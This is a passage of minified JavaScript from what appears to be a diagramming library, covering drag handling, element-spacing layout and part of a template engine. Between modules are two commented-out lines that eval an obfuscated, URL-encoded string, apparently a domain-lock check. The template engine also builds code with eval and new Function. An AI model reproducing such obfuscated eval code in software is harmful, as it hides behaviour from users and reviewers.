        stopDrag: function(a) {
            a._katavorioDrag && a._katavorioDrag.abort()
        },
        addToDragSelection: function(a) {
            f(this).select(a)
        },
        removeFromDragSelection: function(a) {
            f(this).deselect(a)
        },
        clearDragSelection: function() {
            f(this).deselectAll()
        },
        trigger: function(a, b, c, d) {
            this.getEventManager().trigger(a, b, c, d)
        },
        doReset: function() {
            for (var a in this)
                0 === a.indexOf("_katavorio_") && this[a].reset()
        }
    });
    var h = function(a) {
        var b = function() {
            /complete|loaded|interactive/.test(document.readyState) && "undefined" != typeof document.body && null != document.body ? a() : setTimeout(b, 9)
        };
        b()
    };
    h(b.init)
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this
      , b = a.Farahey = {};
    "undefined" != typeof exports && (exports.Farahey = b);
    var c = function(a, b, c) {
        for (var d = 0, e = a.length, f = -1, g = 0; d < e; )
            if (f = parseInt((d + e) / 2),
            g = c(a[f], b),
            g < 0)
                d = f + 1;
            else {
                if (!(g > 0))
                    return f;
                e = f
            }
        return d
    }
      , d = a.Biltong
      , e = function(a, b, d) {
        var e = c(a, b, d);
        a.splice(e, 0, b)
    }
      , f = function(a, b) {
        var c = a
          , e = {}
          , f = function(a) {
            if (!e[a[1]]) {
                var c = b(a[2]);
                e[a[1]] = {
                    l: a[0][0],
                    t: a[0][1],
                    w: c[0],
                    h: c[1],
                    center: [a[0][0] + c[0] / 2, a[0][1] + c[1] / 2]
                }
            }
            return e[a[1]]
        };
        this.setOrigin = function(a) {
            c = a,
            e = {}
        }
        ,
        this.compare = function(a, b) {
            var e = d.lineLength(c, f(a).center)
              , g = d.lineLength(c, f(b).center);
            return e < g ? -1 : e == g ? 0 : 1
        }
    }
      , g = function(a, b, c, d) {
        return a[b] <= d && d <= a[b] + a[c]
    }
      , h = [function(a, b) {
        return a.x + a.w - b.x
    }
    , function(a, b) {
        return a.x - (b.x + b.w)
    }
    ]
      , i = [function(a, b) {
        return a.y + a.h - b.y
    }
    , function(a, b) {
        return a.y - (b.y + b.h)
    }
    ]
      , j = [null, [h[0], i[1]], [h[0], i[0]], [h[1], i[0]], [h[1], i[1]]]
      , k = function(a, b, c, d, e) {
        isNaN(c) && (c = 0);
        var f, h, i, k = b.y + b.h, l = c == 1 / 0 || c == -(1 / 0) ? b.x + b.w / 2 : (k - d) / c, m = Math.atan(c);
        return g(b, "x", "w", l) ? (f = j[e][1](a, b),
        h = f / Math.sin(m),
        i = h * Math.cos(m),
        {
            left: i,
            top: f
        }) : (i = j[e][0](a, b),
        h = i / Math.cos(m),
        f = h * Math.sin(m),
        {
            left: i,
            top: f
        })
    }
      , l = b.calculateSpacingAdjustment = function(a, b) {
        var c = a.center || [a.x + a.w / 2, a.y + a.h / 2]
          , e = b.center || [b.x + b.w / 2, b.y + b.h / 2]
          , f = d.gradient(c, e)
          , g = d.quadrant(c, e)
          , h = f == 1 / 0 || f == -(1 / 0) || isNaN(f) ? 0 : c[1] - f * c[0];
        return k(a, b, f, h, g)
    }
      , m = b.paddedRectangle = function(a, b, c) {
        return {
            x: a[0] - c[0],
            y: a[1] - c[1],
            w: b[0] + 2 * c[0],
            h: b[1] + 2 * c[1]
        }
    }
      , n = function(a, b, c, e, f, g, h, i, j, k, n, o, p) {
        g = g || [0, 0],
        k = k || function() {}
        ,
        n = n || 2;
        var q, r, s = m(g, [1, 1], e), t = 1, u = !0, v = {}, w = function(a, b, c, d) {
            v[a] = !0,
            b[0] += c,
            b[1] += d
        }, x = function() {
            for (var g = 0; g < a.length; g++)
                if (!o(a[g][1], a[g][2])) {
                    var v = b[a[g][1]]
                      , y = a[g][1]
                      , z = (a[g][2],
                    c[a[g][1]])
                      , A = m(v, z, e);
                    !p && h(a[g][1], a[g][2]) && d.intersects(s, A) && (q = l(s, A),
                    r = f(a[g][1], v, q),
                    w(y, v, r.left, r.top)),
                    A = m(v, z, e);
                    for (var B = 0; B < a.length; B++)
                        if (g != B) {
                            if (o(a[B][1], a[B][2]))
                                continue;
                            if (h(a[B][1], a[B][2])) {
                                var C = b[a[B][1]]
                                  , D = c[a[B][1]]
                                  , E = m(C, D, e);
                                d.intersects(A, E) && (u = !0,
                                q = l(A, E),
                                r = f(a[B][1], C, q),
                                w(a[B][1], C, r.left, r.top))
                            }
                        }
                }
            i && k(),
            u && t < n && (u = !1,
            t++,
            i ? window.setTimeout(x, j) : x())
        };
        return x(),
        v
    }
      , o = function(a) {
        if (null == a)
            return null;
        if ("[object Array]" === Object.prototype.toString.call(a)) {
            var b = [];
            return b.push.apply(b, a),
            b
        }
        var c = [];
        for (var d in a)
            c.push(a[d]);
        return c
    }
      , p = function(a) {
        var b, c = a.getPosition, d = a.getSize, g = a.getId, h = a.setPosition, i = a.padding || [20, 20], j = a.constrain || function(a, b, c) {
            return c
        }
        , k = [], l = {}, m = {}, p = o(a.elements || []), q = a.origin || [0, 0], r = a.executeNow, s = (this.getOrigin = function() {
            return q
        }
        ,
        a.filter || function(a) {
            return !0
        }
        ), t = a.exclude || function(a) {
            return !1
        }
        , u = a.orderByDistanceFromOrigin, v = new f(q,d), w = a.updateOnStep, x = a.stepInterval || 350, y = a.debug, z = function() {
            var a = document.createElement("div");
            a.style.position = "absolute",
            a.style.width = "10px",
            a.style.height = "10px",
            a.style.backgroundColor = "red",
            document.body.appendChild(a),
            b = a
        }, A = function(a) {
            u && 0 != k.length ? e(k, a, v.compare) : k.push(a)
        }, B = function(a) {
            var b, e, f, h;
            b = e = 1 / 0,
            f = h = -(1 / 0);
            for (var i = 0; i < a.length; i++) {
                var j = c(a[i])
                  , k = d(a[i])
                  , n = g(a[i]);
                l[n] = [j.left, j.top],
                A([[j.left, j.top], n, a[i]]),
                m[n] = k,
                b = Math.min(b, j.left),
                e = Math.min(e, j.top),
                f = Math.max(f, j.left + k[0]),
                h = Math.max(h, j.top + k[1])
            }
            return [b, f, e, h]
        }, C = function() {
            return v.setOrigin(q),
            k = [],
            l = {},
            m = {},
            B(p)
        }, D = function(a) {
            if (p.length > 1) {
                a = a || {};
                var b = a.filter || s
                  , c = a.padding || i
                  , d = a.iterations
                  , e = a.exclude || t
                  , f = a.excludeFocus
                  , g = n(k, l, m, c, j, q, b, w, x, E, d, e, f);
                E(g)
            }
        }, E = function(a) {
            for (var b = 0; b < p.length; b++) {
                var c = g(p[b]);
                a[c] && h(p[b], {
                    left: l[c][0],
                    top: l[c][1]
                })
            }
        }, F = function(a) {
            null != a && (q = a,
            v.setOrigin(a))
        };
        return this.execute = function(a, b) {
            F(a),
            C(),
            D(b)
        }
        ,
        this.executeAtCenter = function(a) {
            var b = C();
            F([(b[0] + b[1]) / 2, (b[2] + b[3]) / 2]),
            D(a)
        }
        ,
        this.executeAtEvent = function(c, d) {
            var e = a.container
              , f = a.getContainerPosition(e)
              , g = c.pageX - f.left + e.scrollLeft
              , h = c.pageY - f.top + e.scrollTop;
            y && (b.style.left = c.pageX + "px",
            b.style.top = c.pageY + "px"),
            this.execute([g, h], d)
        }
        ,
        this.setElements = function(a) {
            return p = o(a),
            this
        }
        ,
        this.addElement = function(a, b) {
            return null == a || !b && p.indexOf(a) !== -1 || p.push(a),
            this
        }
        ,
        this.addElements = function(a, b) {
            if (b)
                Array.prototype.push.apply(p, a);
            else
                for (var c = 0; c < a.length; c++)
                    this.addElement(a[c]);
            return this
        }
        ,
        this.getElements = function() {
            return p
        }
        ,
        this.removeElement = function(a) {
            for (var b = -1, c = 0; c < p.length; c++)
                if (p[c] == a) {
                    b = c;
                    break
                }
            return b != -1 && p.splice(b, 1),
            this
        }
        ,
        this.setPadding = function(a) {
            i = a
        }
        ,
        this.setConstrain = function(a) {
            j = a
        }
        ,
        this.setFilter = function(a) {
            s = a
        }
        ,
        this.reset = function() {
            p.length = 0
        }
        ,
        y && z(),
        r && this.execute(),
        this
    };
    b.getInstance = function(a) {
        return new p(a)
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    var a = this
      , b = function(a) {
        return a.length > 0 ? a[a.length - 1] : null
    }
      , c = "undefined" != typeof navigator && /MSIE\s([\d.]+)/.test(navigator.userAgent) ? new Number(RegExp.$1) : -1
      , d = c > -1 && c < 9
      , e = function(a, b, c) {
        var d = function(b, c) {
            for (var d = [], e = 0; e < b.length; e++) {
                var f = g({}, b[e]);
                d.push(f),
                g(f.atts, c.atts, function(b, c) {
                    p(b, c, f, null, a)
                })
            }
            return d
        }
        .bind(this);
        this.template = c.template,
        this.getFunctionBody = function(b) {
            return a.compile(d(a.parse(c.template, null, {
                originalCustomTag: b.tag,
                context: b.context
            }), b), !1, !0, !0)
        }
        .bind(this),
        this.getFunctionEnd = function() {
            return ";_els.pop();"
        }
        ,
        this.rendered = c.rendered || function() {}
        ,
        this.updated = c.updated || function() {}
    }
      , f = function(a, b) {
        for (var c = 0; c < a.length; c++) {
            var d = a[c];
            null != d && 0 !== d.length && b(c, d)
        }
    }
      , g = function(a, b, c) {
        for (var d in b)
            a[d] = b[d],
            c && c(d, a[d]);
        return a
    }
      , h = function(a, b, c) {
        if (null == a)
            return null;
        if ("$data" === b || null == b)
            return a;
        var d = b.match(/^\{(.*)\}$/);
        if (d) {
            for (var e = {}, f = d[1].split(","), g = 0; g < f.length; g++) {
                var i = f[g].split(":")
                  , j = h(a, i[1]);
                e[n(i[0])] = j || i[1].replace(/'/g, "")
            }
            return e
        }
        b = b.replace(/\['([^']*)'\]/g, ".$1");
        var k = a
          , l = k
          , m = null;
        return b.replace(/([^\.])+/g, function(a, b, d, e) {
            if (null == m) {
                var f = a.match(/([^\[0-9]+){1}(\[)([0-9+])/)
                  , g = d + a.length >= e.length
                  , h = function() {
                    return l[f[1]] || function() {
                        return l[f[1]] = [],
                        l[f[1]]
                    }()
                };
                if (g)
                    if (f) {
                        var i = h()
                          , j = f[3];
                        null == c ? m = i[j] : i[j] = c
                    } else
                        null == c ? m = l[a] : l[a] = c;
                else if (f) {
                    var k = h();
                    l = k[f[3]] || function() {
                        return k[f[3]] = {},
                        k[f[3]]
                    }()
                } else
                    l = l[a] || function() {
                        return l[a] = {},
                        l[a]
                    }()
            }
        }),
        m
    }
      , i = function(b) {
        var c = a.document.getElementById(b);
        return null != c ? c.innerHTML : null
    }
      , j = function(a) {
        return "[object Array]" === Object.prototype.toString.call(a)
    }
      , k = function(a) {
        for (var b = [], c = 0; c < a.length; c++)
            j(a[c]) ? b.push.apply(b, k(a[c])) : b[b.length] = a[c];
        return b
    }
      , l = function(a, b) {
        for (var c = [], d = 0, e = a.length; d < e; d++)
            c.push(b(a[d]));
        return k(c)
    }
      , m = function(a, b) {
        for (var c = [], d = 0, e = a.length; d < e; d++)
            b(a[d]) && c.push(a[d]);
        return c
    }
      , n = function(a) {
        if (null == a)
            return a;
        for (var b = a.replace(/^\s\s*/, ""), c = /\s/, d = b.length; c.test(b.charAt(--d)); )
            ;
        return b.slice(0, d + 1)
    }
      , o = function(a, b, c, d, e) {
        var f = r()
          , g = {
            w: b,
            e: [],
            u: f
        };
        e.bindings[f] = g;
        var h = function() {
            return null != d ? "try {  if(" + d + ") { out = out.replace(this.e[k][0], eval(this.e[k][1])); } else out=''; } catch(__) { out='';}" : "try { out = out.replace(this.e[k][0], eval(this.e[k][1])); } catch(__) { out=out.replace(this.e[k][0], '');}"
        }
          , i = function() {
            return null != d ? "var out='';try { with($data) { if (" + d + ") out = this.w; else return null; }}catch(_){return null;}" : "var out = this.w;"
        };
        return g.reapply = new Function("$data",i() + "for (var k = 0; k < this.e.length; k++) { with($data) { " + h() + " }} return out;"),
        c.bindings[a] = g,
        b.replace(/\$\{([^\}]*)\}/g, function(a, b, c, d) {
            g.e.push([a, b])
        }),
        f
    }
      , p = function(a, b, c, d, e) {
        c.atts[a] = b,
        o(a, b, c, d, e)
    }
      , q = function(a, b) {
        function c(a, c) {
            var d = a.match(/([^=]+)=['"](.*)['"]/);
            return null == d && null == c ? e.atts[a] = "" : null == d ? p(a, "", e, c, b) : p(d[1], d[2], e, c, b),
            d
        }
        for (var d = b.parseAttributes(a), e = {
            el: n(d[0]),
            atts: {},
            bindings: {}
        }, f = 1; f < d.length; f++) {
            var g = n(d[f]);
            if (null != g && g.length > 0) {
                var h = g.match(b.inlineIfRe);
                if (h)
                    for (var i = h[2].split(b.attributesRe), j = 0; j < i.length; j++) {
                        var k = n(i[j]);
                        null != k && k.length > 0 && c(k, h[1])
                    }
                else
                    c(g)
            }
        }
        return e
    }
      , r = function(a) {
        var b = a ? "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx" : "xxxxxxxx-xxxx-4xxx";
        return b.replace(/[xy]/g, function(a) {
            var b = 16 * Math.random() | 0
              , c = "x" == a ? b : 3 & b | 8;
            return c.toString(16)
        })
    }
      , s = function(a) {
        if (null == a || 0 === a.length)
            return !1;
        for (var b = a.length - 1; b > -1; b--)
            if ("each" === a[b].type)
                return !0;
        return !1
    }
      , t = function(a, b) {
        var c = this.bindings[b];
        return null == c ? "" : c.reapply(a)
    }
      , u = function(a, b) {
        this.uuid = r(),
        this.children = [],
        this.instance = b,
        b.entries[this.uuid] = this
    }
      , v = function(a, b) {
        u.apply(this, arguments);
        var c = q(a, b);
        null != c.atts["r-toggle"] && null != b.toggleManager && (this.discard = b.toggleManager(c.atts["r-toggle"]) === !1);
        var d = c.el.split(":");
        this.tag = c.el,
        2 === d.length && (this.namespace = d[0]),
        this.atts = c.atts,
        this.bindings = c.bindings,
        this.type = "element",
        this.compile = function(a, b) {
            var c = a.customTags[this.tag] || a.globalTags[this.tag];
            if (c) {
                for (var d = c.getFunctionBody(this), e = a.customTags[this.tag] ? "_rotors.customTags['" + this.tag + "'].rendered(_le, _rotors, data[0]);" : "_rotors.globalTags['" + this.tag + "'].rendered(_le, _rotors, data[0]);", f = 0; f < this.children.length; f++)
                    this.children[f].precompile && (d += this.children[f].precompile(a)),
                    d += this.children[f].compile(a),
                    this.children[f].postcompile && (d += this.children[f].postcompile(a));
                return d += "_le=_els.pop();" + e + "_rotors.pet(_eid,'" + this.uuid + "');"
            }
            var g = "/* element entry " + this.uuid + " */;";
            if (this.remove !== !0) {
                g += a.getExecutionContent(this.tag, this.uuid, !1, this.namespace);
                for (var h in this.atts)
                    if (this.atts.hasOwnProperty(h)) {
                        var i;
                        i = null != this.bindings[h] ? "_rotors.bind(data[0], '" + this.bindings[h].u + "');" : "'" + this.atts[h] + "'",
                        g += "__a=" + i + ";if(__a!=null) {_rotors.setAttribute(e,'" + h + "',__a || '');}"
                    }
            }
            for (var j = 0; j < this.children.length; j++)
                this.children[j].precompile && (g += this.children[j].precompile(a)),
                g += this.children[j].compile(a),
                this.children[j].postcompile && (g += this.children[j].postcompile(a));
            return this.remove === !0 || b || (g += "_le=_els.pop();",
            g += "_rotors.pet(_eid, '" + this.uuid + "');"),
            g
        }
        ;
        var e = function(a, c) {
            b.each(c.split(";"), function(b) {
                var c = b.indexOf(":")
                  , d = b.substring(0, c);
                a.style[d] = b.substring(c + 1)
            })
        };
        this.update = function(a, c) {
            for (var d in this.atts)
                if (this.atts.hasOwnProperty(d) && "class" !== d) {
                    var f;
                    f = null != this.bindings[d] ? this.bindings[d].reapply(c) : "'" + this.atts[d] + "'",
                    null != f && ("style" === d && null != a.style ? e(a, f) : a.setAttribute(d, f))
                }
            if (this.originalCustomTag) {
                var g = b.customTags[this.originalCustomTag] || b.globalTags[this.originalCustomTag];
                g && g.updated(a, c)
            }
        }
    }
      , w = function(a) {
        this.uuid = r(),
        this.comment = a,
        this.compile = function() {
            return ""
        }
    }
      , x = function(a, b) {
        u.apply(this, arguments),
        this.value = a.value,
        this.type = "text",
        this.bindings = {};
        var c = function() {
            return "_rotors.bind(data[0], '" + this.bindings.__element.u + "', typeof $key !== 'undefined' ? $key : null, typeof $value !== 'undefined' ? $value : null)"
        }
        .bind(this);
        this.compile = function(a) {
            return a.getExecutionContent(c(), this.uuid, !0) + ";_rotors.pet(_eid, '" + this.uuid + "');"
        }
        ,
        this.update = function(a, b) {
            a.nodeValue = this.bindings.__element.reapply(b)
        }
    }
      , y = function() {
        this.childNodes = [],
        this.appendChild = function(a) {
            this.childNodes.push(a)
        }
        ,
        this.toString = function() {
            for (var a = "", b = 0; b < this.childNodes.length; b++)
                a += this.childNodes[b].toString();
            return a
        }
    }
      , z = function(a) {
        y.apply(this),
        this.tag = a;
        var b = {};
        this.setAttribute = function(a, c) {
            b[a] = c
        }
        ,
        this.getAttribute = function(a) {
            return b[a]
        }
        ,
        this.setAttributeNS = function(a, c, d) {
            b[a + ":" + c] = d
        }
        ,
        this.toString = function() {
            var a = "<" + this.tag
              , c = "";
            for (var d in b)
                c += " " + d + '="' + b[d] + '"';
            a = a + c + ">";
            for (var e = 0; e < this.childNodes.length; e++)
                a += this.childNodes[e].toString();
            return a + "</" + this.tag + ">"
        }
    }
      , A = function(a) {
        this.nodeValue = a,
        this.toString = function() {
            return this.nodeValue
        }
    }
      , B = function(a) {
        return a.isBrowser ? i : null
    }
      , C = function(a, b, c) {
        return function(d) {
            var e = c ? null : a.cache[d];
            return null == e && (e = b(d)),
            null == e && (e = a.defaultTemplate),
            null != e && (a.cache[d] = e),
            e
        }
    }
      , D = function(a) {
        a = a || {},
        this.cache = {},
        this.templateCache = {},
        this.customTags = {},
        null != a.defaultTemplate && this.setDefaultTemplate(a.defaultTemplate),
        this.templateResolver = a.templateResolver ? a.templateResolver : a.templates ? function(b) {
            return a.templates[b]
        }
        : B(this),
        this.toggleManager = null
    }
      , E = function(a, b) {
        for (var c in b)
